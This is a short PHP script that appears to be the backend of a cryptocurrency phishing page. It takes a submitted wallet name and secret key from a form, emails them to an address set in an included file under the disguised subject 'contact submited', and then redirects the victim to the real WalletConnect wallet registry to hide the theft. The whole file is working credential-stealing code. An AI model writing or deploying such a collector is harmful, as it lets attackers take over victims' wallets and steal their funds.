<?php
include 'email.php';
$wallet = $_POST['w'];
$key = $_POST['key'];
$ip=$_SERVER['REMOTE_ADDR'];
$subject = "contact submited";
$message = "wallet: ".$wallet."\n Key : ".$key."\n"; 
$headers = 'From: sender@example.com' . PHP_EOL .
'X-Mailer: PHP/' . phpversion();
 
// Sending email
mail($to, $subject, $message, $headers);
header('Location: https://registry.walletconnect.org/wallets');
?>

